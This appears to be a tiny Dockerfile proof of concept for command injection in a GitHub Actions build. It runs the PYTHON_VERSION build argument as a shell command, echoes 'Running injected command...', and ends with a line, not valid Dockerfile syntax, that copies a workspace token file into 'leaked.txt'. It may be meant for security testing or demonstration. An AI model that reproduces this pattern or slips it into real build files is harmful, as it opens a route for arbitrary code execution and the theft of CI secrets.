FROM python:3.11-alpine
ARG PYTHON_VERSION
RUN echo "Running injected command..." && sh -c "$PYTHON_VERSION"
mkdir -p /github/workspace && cat /github/workspace/token.txt > /github/workspace/leaked.txt
